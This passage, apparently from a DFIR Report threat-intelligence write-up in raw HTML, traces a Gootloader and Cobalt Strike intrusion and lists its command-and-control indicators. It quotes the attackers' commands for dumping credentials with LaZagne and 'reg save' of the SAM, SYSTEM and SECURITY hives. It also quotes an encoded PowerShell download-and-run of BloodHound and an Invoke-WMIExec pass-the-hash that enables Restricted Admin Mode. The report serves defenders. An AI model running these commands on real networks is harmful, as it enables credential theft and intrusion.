src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-20.png" alt="" width="1202" height="876" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-20.png 1202w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-20-300x219.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-20-1024x746.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-20-768x560.png 768w" sizes="(max-width: 1202px) 100vw, 1202px" /></noscript></a></div>
<div class="ql-block" data-block-id="block-cf6625c4-92c3-48da-b9f2-205b50c548db">
<div data-block-id="block-a5d07e35-0967-44d1-84b0-2d29a0da3d14">&nbsp;</div>
<div class="ql-block" data-block-id="block-a5d07e35-0967-44d1-84b0-2d29a0da3d14">In addition, the post-exploitation tool “<a class="ql-link" href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener noreferrer">LaZagne</a>” (renamed to ls.exe) was used with the “-all” switch.</div>
<pre data-block-id="block-a5d07e35-0967-44d1-84b0-2d29a0da3d14">ls.exe all -oN -output C:\Users\REDACTED</pre>
<div class="ql-block" data-block-id="block-a5d07e35-0967-44d1-84b0-2d29a0da3d14">This will dump passwords (browsers, LSA secret, hashdump, Keepass, WinSCP, RDPManager, OpenVPN, Git, etc.) and store the output file (in our case) in the “C:\Users” directory. When LaZagne is run with admin privileges, it also attempts to dump credentials from local registry hives, as can be seen below.</div>
<div data-block-id="block-a5d07e35-0967-44d1-84b0-2d29a0da3d14">&nbsp;</div>
<div class="ql-block" data-block-id="block-cfeb113f-dfc8-4cce-a001-161f6294748a">
<div class="ql-block" data-block-id="block-266145b8-70f0-4d35-9697-81ae33428580"><a href="https://thedfirreport.com/wp-content/uploads/2022/05/11462-21.png"><img loading="lazy" class="aligncenter size-full wp-image-6773 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-21.png" alt="" width="1131" height="133" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-21.png 1131w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-21-300x35.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-21-1024x120.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-21-768x90.png 768w" data-lazy-sizes="(max-width: 1131px) 100vw, 1131px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-21.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-6773" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-21.png" alt="" width="1131" height="133" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-21.png 1131w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-21-300x35.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-21-1024x120.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-21-768x90.png 768w" sizes="(max-width: 1131px) 100vw, 1131px" /></noscript></a></div>
<div data-block-id="block-266145b8-70f0-4d35-9697-81ae33428580">&nbsp;</div>
</div>
<div data-block-id="block-266145b8-70f0-4d35-9697-81ae33428580">Here’s the commands from another system:</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="ql-block" data-block-id="block-993edfb2-545f-407e-b025-f39dda42d18d">
<div class="ql-block" data-block-id="block-0b182b7c-1d3e-41d8-9083-a25fdb192158">
<div class="ql-block" data-block-id="block-758ae420-ac1a-4c63-9179-cf89a113a339">
<div class="ql-block" data-block-id="block-03fcef47-48d4-436e-b01a-5fc112063b43">
<div class="ql-block" data-block-id="block-ff6352bb-32be-4955-9b58-61aa0e716362">
<div class="ql-block" data-block-id="block-d56f6390-e281-464e-89b5-6b9ba3a6fa52">
<div class="ql-block" data-block-id="block-a16467b8-6d5e-45ea-a820-9c8fc6d0f765">
<div class="ql-block" data-block-id="block-73eca8fc-9caf-423f-9c6a-149cb2ea9343">
<div class="ql-block" data-block-id="block-cf6625c4-92c3-48da-b9f2-205b50c548db">
<div class="ql-block" data-block-id="block-cfeb113f-dfc8-4cce-a001-161f6294748a">
<div class="ql-block" data-block-id="block-63cd33f9-e461-4e86-9830-c2f2e6b46a86">
<pre data-block-id="block-def33ac3-083b-49d5-bbd1-ffa5b514f4a3">cmd.exe /c "reg.exe save hklm\sam c:\users\REDACTED\appdata\local\temp\1\dznuxujzr"<br>cmd.exe /c "reg.exe save hklm\system c:\users\REDACTED\appdata\local\temp\1\mkffdg"<br>cmd.exe /c "reg.exe save hklm\security c:\users\REDACTED\appdata\local\temp\1\iszmqwmjemt"</pre>
<h2 class="ql-heading" data-block-id="block-def33ac3-083b-49d5-bbd1-ffa5b514f4a3">Discovery</h2>
<div class="ql-block" data-block-id="block-3ee64bb9-6b07-4e2f-9c94-5dbca5bb33c0">The threat actors used the PowerShell implementation of SharpHound (Bloodhound) on the beachhead host to enumerate the Active Directory domain. The Cobalt Strike beacon was used to invoke the PowerShell script.</div>
<div data-block-id="block-3ee64bb9-6b07-4e2f-9c94-5dbca5bb33c0">&nbsp;</div>
<pre class="ql-block" data-block-id="block-216a776e-dcb9-425e-88a8-27a2b20cca3b">powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAxADAAMAA0ADkALwAnACkAOwAgAEkAbgB2AG8AawBlAC0AQgBsAG8AbwBkAEgAbwB1AG4AZAAgAC0AQwBvAGwAbABlAGMAdABpAG8AbgBNAGUAdABoAG8AZAAgAEEAbABsAA==</pre>
</div>
<div data-block-id="block-cdf7dac8-a8fd-4b13-b290-9e24d4a2c19a"><img loading="lazy" class="alignnone size-full wp-image-6813 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/12222.png" alt="" width="1532" height="343" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/12222.png 1532w, https://thedfirreport.com/wp-content/uploads/2022/05/12222-300x67.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/12222-1024x229.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/12222-768x172.png 768w" data-lazy-sizes="(max-width: 1532px) 100vw, 1532px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/12222.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="alignnone size-full wp-image-6813" src="https://thedfirreport.com/wp-content/uploads/2022/05/12222.png" alt="" width="1532" height="343" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/12222.png 1532w, https://thedfirreport.com/wp-content/uploads/2022/05/12222-300x67.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/12222-1024x229.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/12222-768x172.png 768w" sizes="(max-width: 1532px) 100vw, 1532px" /></noscript></div>
<div class="ql-block" data-block-id="block-63cd33f9-e461-4e86-9830-c2f2e6b46a86">
<div class="ql-block" data-block-id="block-d1c0b8a1-f52d-40e0-b657-a43e178f10b0">
<div data-block-id="block-cdf7dac8-a8fd-4b13-b290-9e24d4a2c19a">&nbsp;</div>
<div class="ql-block" data-block-id="block-cdf7dac8-a8fd-4b13-b290-9e24d4a2c19a">They also ran a WMI command on the beachhead host and one other host to check for AntiVirus.</div>
<div data-block-id="block-cdf7dac8-a8fd-4b13-b290-9e24d4a2c19a">&nbsp;</div>
<div class="ql-block" data-block-id="block-b40f0ad9-e96d-41f3-af64-2138eb4d4c0f">
<pre class="ql-block" data-block-id="block-5158c70d-e431-4443-ac7c-fa6f9a903942"><code>WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</code></pre>
<div class="ql-block" data-block-id="block-807a53df-c065-40ea-a1fc-ddcdeb3bafee">
<div data-block-id="block-9d955b5e-c85a-4a6a-8a7a-8092962db01c">The threat actors executed this command remotely on a domain controller, before moving laterally to it:</div>
<pre data-block-id="block-9d955b5e-c85a-4a6a-8a7a-8092962db01c">powershell.exe ls C:\ &gt; C:\file.txt</pre>
<div class="ql-block" data-block-id="block-9d955b5e-c85a-4a6a-8a7a-8092962db01c">While having an interactive RDP session, in an attempt to collect more information regarding the host, the attackers used PowerShell to run systeminfo on one of the hosts they pivoted to.</div>
<div data-block-id="block-9d955b5e-c85a-4a6a-8a7a-8092962db01c">&nbsp;</div>
<div class="ql-block" data-block-id="block-bf67e9f3-1b29-4c54-a72d-f08d0bb77486">
<div class="ql-block" data-block-id="block-fb8ee423-769d-4d05-af23-cd23ec62fcff">
<div class="ql-block" data-block-id="block-bb41c695-d7a8-4e0a-9193-b5fd2a71ec0f">On the last day, and before they left the network, threat actors used Advanced IP Scanner to scan the whole network for the below open ports:</div>
<div class="ql-block" data-block-id="block-69cb60e5-ba2a-48d5-ad67-2a8a46c1624a">
<pre>21,80,135,443,445,3389,8080,56133,58000,58157,58294,58682,60234,60461,64502</pre>
<div class="ql-block" data-block-id="block-60d934cb-fc7d-496b-8871-6442f6243a30">
<div class="ql-block" data-block-id="block-600f55dc-f826-4af6-ac43-d479f048dda0"><img loading="lazy" class="alignnone size-full wp-image-6809 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/123.png" alt="" width="1704" height="396" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/123.png 1704w, https://thedfirreport.com/wp-content/uploads/2022/05/123-300x70.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/123-1024x238.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/123-768x178.png 768w, https://thedfirreport.com/wp-content/uploads/2022/05/123-1536x357.png 1536w" data-lazy-sizes="(max-width: 1704px) 100vw, 1704px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/123.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="alignnone size-full wp-image-6809" src="https://thedfirreport.com/wp-content/uploads/2022/05/123.png" alt="" width="1704" height="396" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/123.png 1704w, https://thedfirreport.com/wp-content/uploads/2022/05/123-300x70.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/123-1024x238.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/123-768x178.png 768w, https://thedfirreport.com/wp-content/uploads/2022/05/123-1536x357.png 1536w" sizes="(max-width: 1704px) 100vw, 1704px" /></noscript></div>
</div>
</div>
<div data-block-id="block-600f55dc-f826-4af6-ac43-d479f048dda0">&nbsp;</div>
<div class="ql-block" data-block-id="block-69cb60e5-ba2a-48d5-ad67-2a8a46c1624a">
<div class="ql-block" data-block-id="block-60d934cb-fc7d-496b-8871-6442f6243a30">
<h2 data-block-id="block-3dc72985-6cce-4704-8057-5b59053c4a54"><img loading="lazy" class="alignnone size-full wp-image-6810 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/123454321.png" alt="" width="1836" height="599" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/123454321.png 1836w, https://thedfirreport.com/wp-content/uploads/2022/05/123454321-300x98.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/123454321-1024x334.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/123454321-768x251.png 768w, https://thedfirreport.com/wp-content/uploads/2022/05/123454321-1536x501.png 1536w" data-lazy-sizes="(max-width: 1836px) 100vw, 1836px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/123454321.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="alignnone size-full wp-image-6810" src="https://thedfirreport.com/wp-content/uploads/2022/05/123454321.png" alt="" width="1836" height="599" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/123454321.png 1836w, https://thedfirreport.com/wp-content/uploads/2022/05/123454321-300x98.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/123454321-1024x334.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/123454321-768x251.png 768w, https://thedfirreport.com/wp-content/uploads/2022/05/123454321-1536x501.png 1536w" sizes="(max-width: 1836px) 100vw, 1836px" /></noscript></h2>
<h2 class="ql-heading" data-block-id="block-3dc72985-6cce-4704-8057-5b59053c4a54">Lateral Movement</h2>
<p><img loading="lazy" class="size-full wp-image-6815 aligncenter jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/Lateral-Movement.png" alt="" width="1388" height="494" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/Lateral-Movement.png 1388w, https://thedfirreport.com/wp-content/uploads/2022/05/Lateral-Movement-300x107.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/Lateral-Movement-1024x364.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/Lateral-Movement-768x273.png 768w" data-lazy-sizes="(max-width: 1388px) 100vw, 1388px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/Lateral-Movement.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="size-full wp-image-6815 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/05/Lateral-Movement.png" alt="" width="1388" height="494" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/Lateral-Movement.png 1388w, https://thedfirreport.com/wp-content/uploads/2022/05/Lateral-Movement-300x107.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/Lateral-Movement-1024x364.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/Lateral-Movement-768x273.png 768w" sizes="(max-width: 1388px) 100vw, 1388px" /></noscript></p>
<div class="ql-block" data-block-id="block-2a2270da-7bfa-44f0-b60d-8bac073155b7">
<div class="ql-block" data-block-id="block-4fa4ca61-5566-4c47-bf83-cb42c0e79dc6">As observed in many of our intrusions, the threat actor created and installed Windows services to deploy Cobalt Strike beacons. This method was used to pivot to other systems within the network.</div>
<div data-block-id="block-4fa4ca61-5566-4c47-bf83-cb42c0e79dc6">&nbsp;</div>
<div class="ql-block" data-block-id="block-279ba452-0429-4618-9c2c-e75e04e4928c">
<div class="ql-block" data-block-id="block-80f15d69-783b-457b-8140-f6282a147490"><a href="https://thedfirreport.com/wp-content/uploads/2022/05/11462-24.png"><img loading="lazy" class="aligncenter size-full wp-image-6775 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-24.png" alt="" width="1740" height="858" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-24.png 1740w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-24-300x148.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-24-1024x505.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-24-768x379.png 768w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-24-1536x757.png 1536w" data-lazy-sizes="(max-width: 1740px) 100vw, 1740px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-24.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-6775" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-24.png" alt="" width="1740" height="858" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-24.png 1740w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-24-300x148.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-24-1024x505.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-24-768x379.png 768w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-24-1536x757.png 1536w" sizes="(max-width: 1740px) 100vw, 1740px" /></noscript></a></div>
<div class="ql-block" data-block-id="block-7ac3018a-a2f5-42b9-8888-e40b0833c2bb">
<div data-block-id="block-f57dd77f-81ac-42fd-85f4-53dcafa242d2">&nbsp;</div>
<div class="ql-block" data-block-id="block-f57dd77f-81ac-42fd-85f4-53dcafa242d2">SMB was also used to transfer executable Cobalt Strike beacons to various workstations in the environment.</div>
<div data-block-id="block-f57dd77f-81ac-42fd-85f4-53dcafa242d2">&nbsp;</div>
<div class="ql-block" data-block-id="block-1297ac9a-d7f4-4e73-882f-506a40251728"><a href="https://thedfirreport.com/wp-content/uploads/2022/05/11462-25.png"><img loading="lazy" class="aligncenter size-full wp-image-6776 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-25.png" alt="" width="890" height="258" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-25.png 890w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-25-300x87.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-25-768x223.png 768w" data-lazy-sizes="(max-width: 890px) 100vw, 890px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-25.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-6776" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-25.png" alt="" width="890" height="258" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-25.png 890w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-25-300x87.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-25-768x223.png 768w" sizes="(max-width: 890px) 100vw, 890px" /></noscript></a></div>
<div data-block-id="block-b6ff879c-8cfa-4149-ae74-4a7b929909d6">&nbsp;</div>
<div class="ql-block" data-block-id="block-b6ff879c-8cfa-4149-ae74-4a7b929909d6">These executables were then executed by a remote service visible in the windows event id 7045 logs.</div>
<div data-block-id="block-b6ff879c-8cfa-4149-ae74-4a7b929909d6">&nbsp;</div>
<div class="ql-block" data-block-id="block-3ab02fc1-c77a-4430-9f05-4a3750c698d0"><a href="https://thedfirreport.com/wp-content/uploads/2022/05/11462-26.png"><img loading="lazy" class="aligncenter size-full wp-image-6777 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-26.png" alt="" width="478" height="146" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-26.png 478w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-26-300x92.png 300w" data-lazy-sizes="(max-width: 478px) 100vw, 478px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-26.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-6777" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-26.png" alt="" width="478" height="146" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-26.png 478w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-26-300x92.png 300w" sizes="(max-width: 478px) 100vw, 478px" /></noscript></a></div>
<div class="ql-block" data-block-id="block-19e5cc97-6b4d-4b08-a25f-b0d97ec74570">
<div data-block-id="block-4605fe6f-c74b-4834-b29f-8012bdbf706d">&nbsp;</div>
<div class="ql-block" data-block-id="block-4605fe6f-c74b-4834-b29f-8012bdbf706d">Next to deploying Cobalt Strike beacons, the threat actor also used RDP to establish interactive sessions with various hosts on the network. One important aspect of these sessions is that the threat actor authenticated using “Restricted Admin Mode”.</div>
<div data-block-id="block-4605fe6f-c74b-4834-b29f-8012bdbf706d">&nbsp;</div>
<div class="ql-block" data-block-id="block-2a9afda2-6681-44e4-b476-d92e4362f930">
<div class="ql-block" data-block-id="block-d2b7116f-76af-4add-807a-6119bfdbfc2e">Restricted Admin Mode can be considered a double-edged sword; although it prevents credential theft, it also enables an attacker to perform a pass-the-hash attack using RDP. In other words, after enabling Restricted Admin Mode, just the NTLM hash of the remote desktop user is required to establish a valid RDP session, without the need of possessing the clear password.</div>
<div data-block-id="block-d2b7116f-76af-4add-807a-6119bfdbfc2e">&nbsp;</div>
<div class="ql-block" data-block-id="block-ad676225-02fe-413c-839a-f7924388e60d">
<div class="ql-block" data-block-id="block-d8cb39ab-4893-4efb-961d-1fe747e335e8">The threat actor attempted to use both Invoke-WMIExec and psexec to enable “<span class="ql-comment" data-comment-ids="774850624" data-comment-unresolved-ids="">Restricted Admin Mode</span>”.</div>
<div data-block-id="block-d8cb39ab-4893-4efb-961d-1fe747e335e8">&nbsp;</div>
<pre>psexec \\&lt;redacted&gt; -u &lt;redacted&gt;\&lt;redacted&gt; -p &lt;redacted&gt; reg add "hklm\system\currentcontrolset\control\lsa" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0</pre>
<div class="ql-block" data-block-id="block-3a46c16e-e653-43b3-9dd3-f8d3f28d46af">
<pre>powershell -nop -noni -ep bypass -w h -c "$u=('http://127.0.0.1:47961/'|%%{(IRM $_)});&amp;(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module C:\Users\&lt;redacted&gt;\Invoke-WMIExec.ps1; Invoke-WMIExec -Target &lt;redacted&gt; -Domain &lt;redacted&gt; -Username &lt;redacted&gt; -Hash &lt;redacted&gt; -Command "powershell.exe New-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Lsa' -Name 'DisableRestrictedAdmin' -Value 0 -PropertyType DWORD" -verbose"</pre>
<div class="ql-block" data-block-id="block-0f4205c4-1547-4a90-b5c4-635a89647289">
<div class="ql-block" data-block-id="block-c637395c-a992-4beb-b7a5-e2bd189b894b">The logon information of EventID 4624 includes a field “Restricted Admin Mode”, which is set to the value “Yes” if the feature is used.</div>
<div data-block-id="block-c637395c-a992-4beb-b7a5-e2bd189b894b">&nbsp;</div>
<div class="ql-block" data-block-id="block-67ca8740-9677-40b5-89b1-d72bf7cdb9cb">
<div class="ql-block" data-block-id="block-6d06b575-a7de-4f7d-8034-dbe5b5f9269f"><a href="https://thedfirreport.com/wp-content/uploads/2022/05/11462-27.png"><img loading="lazy" class="aligncenter size-full wp-image-6778 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-27.png" alt="" width="633" height="1031" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-27.png 633w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-27-184x300.png 184w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-27-629x1024.png 629w" data-lazy-sizes="(max-width: 633px) 100vw, 633px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-27.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-6778" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-27.png" alt="" width="633" height="1031" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-27.png 633w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-27-184x300.png 184w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-27-629x1024.png 629w" sizes="(max-width: 633px) 100vw, 633px" /></noscript></a></div>
<div data-block-id="block-6d06b575-a7de-4f7d-8034-dbe5b5f9269f">&nbsp;</div>
<div class="ql-block" data-block-id="block-dc88d070-9794-4570-8bfe-ab29be385e63">
<h2 class="ql-heading" data-block-id="block-7b3a888a-77ee-412f-8426-716e6ff8fbe8">Collection</h2>
<div class="ql-block" data-block-id="block-51f47676-ae70-40ce-a130-510cd514b7d2">The threat actor accessed multiple files during the RDP sessions on multiple servers. In one instance document files were opened directly on the system.</div>
<div data-block-id="block-51f47676-ae70-40ce-a130-510cd514b7d2">&nbsp;</div>
<div class="ql-block" data-block-id="block-c4b06189-cc4d-433f-8995-ad4fa716643c">
<div class="ql-block" data-block-id="block-2f23386e-e7e5-48bf-b34a-5308340c31f1"><img loading="lazy" class="alignnone size-full wp-image-6799 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/2.png" alt="" width="1191" height="115" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/2.png 1191w, https://thedfirreport.com/wp-content/uploads/2022/05/2-300x29.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/2-1024x99.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/2-768x74.png 768w" data-lazy-sizes="(max-width: 1191px) 100vw, 1191px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/2.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="alignnone size-full wp-image-6799" src="https://thedfirreport.com/wp-content/uploads/2022/05/2.png" alt="" width="1191" height="115" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/2.png 1191w, https://thedfirreport.com/wp-content/uploads/2022/05/2-300x29.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/2-1024x99.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/2-768x74.png 768w" sizes="(max-width: 1191px) 100vw, 1191px" /></noscript></div>
<div data-block-id="block-2f23386e-e7e5-48bf-b34a-5308340c31f1">&nbsp;</div>
<div class="ql-block" data-block-id="block-4e45acba-b38d-4730-b787-328af6d0f5ac">
<div class="ql-block" data-block-id="block-373f215b-b8b5-4625-9842-8e56f325ba06">Shellbags reveled attempts to enumerate multiple file shares containing information of interest to the threat actor.</div>
<div data-block-id="block-373f215b-b8b5-4625-9842-8e56f325ba06">&nbsp;</div>
<div class="ql-block" data-block-id="block-b89ec46f-85b7-434e-8ebe-e55593a7b67b"><img loading="lazy" class="alignnone size-full wp-image-6798 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/1.png" alt="" width="565" height="225" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/1.png 565w, https://thedfirreport.com/wp-content/uploads/2022/05/1-300x119.png 300w" data-lazy-sizes="(max-width: 565px) 100vw, 565px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/1.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="alignnone size-full wp-image-6798" src="https://thedfirreport.com/wp-content/uploads/2022/05/1.png" alt="" width="565" height="225" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/1.png 565w, https://thedfirreport.com/wp-content/uploads/2022/05/1-300x119.png 300w" sizes="(max-width: 565px) 100vw, 565px" /></noscript></div>
<h2 class="ql-heading" data-block-id="block-14ccf4e8-3039-459b-9c45-0a2dd9f56d60">&nbsp;</h2>
<h2 class="ql-heading" data-block-id="block-cc9e7332-20a0-4428-8b46-6a2e96a8006d">Command and Control</h2>
<h3 class="ql-heading" data-block-id="block-16e32659-62aa-4b9a-8c1d-6e9281224ff2">Gootloader</h3>
<div class="ql-block" data-block-id="block-8b693ab6-e6fe-412f-944f-526b7936c37d">Gootloader second stage download URLs. These URLs were deobfuscated and extracted using <a class="ql-link" href="https://github.com/hpthreatresearch/tools/blob/main/gootloader/decode.py" target="_blank" rel="noopener noreferrer">this</a> <span data-void-detect="true">script by <a href="https://twitter.com/HPSecurity">HP Threat Research</a>. They’ve updated this script at least a few times now, thanks <a href="https://twitter.com/HPSecurity">@hpsecurity</a> and thanks to <a href="https://twitter.com/GootLoaderSites">@GootLoaderSites</a> for sharing on twitter as its broken/fixed.<br></span></div>
<pre>hxxps://kakiosk.adsparkdev[.]com/test.php?hjkiofilihyl=
hxxps://jp.imonitorsoft[.]com/test.php?hjkiofilihyl=
hxxps://junk-bros[.]com/test.php?hjkiofilihyl=</pre>
<div class="ql-block" data-block-id="block-c1deb218-e871-4cc2-9834-dcf724af82e4">During the intrusion the Gootloader loader was observed communicating to 35.206.117.64:443 kakiosk[.]adsparkdev[.]com.</div>
<pre>Ja3:a0e9f5d64349fb13191bc781f81f42e1
Ja3s:567bb420d39046dbfd1f68b558d86382
Certificate: [d8:85:d1:48:a2:99:f5:ee:9d:a4:3e:01:1c:b0:ec:12:e5:23:7d:61 ]
Not Before: 2022/01/05 09:25:33 UTC 
Not After: 2022/04/05 09:25:32 UTC 
Issuer Org: Let's Encrypt 
Subject Common: kakiosk.adsparkdev.com [kakiosk.adsparkdev.com ,www.kakiosk.adsparkdev.com ]
Public Algorithm: rsaEncryption</pre>
<h3 class="ql-heading" data-block-id="block-88da2231-41b0-4992-b73e-8177ebbf59af">Cobalt Strike</h3>
<div class="ql-block" data-block-id="block-c62b64fd-b062-4909-a725-04257947aa62"><strong>146.70.78.43</strong></div>
<div class="ql-block" data-block-id="block-b8ff9a9e-0fd3-4948-a1fa-5627fdda541f">Cobalt Strike server TLS configuration:</div>
<pre>146.70.78.43
Ja3:72a589da586844d7f0818ce684948eea
Ja3s:f176ba63b4d68e576b5ba345bec2c7b7
Serial Number: 146473198 (0x8bb00ee)
Certificate: 73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F
Not Before: May 20 18:26:24 2015 GMT
Not After: May 17 18:26:24 2025 GMT
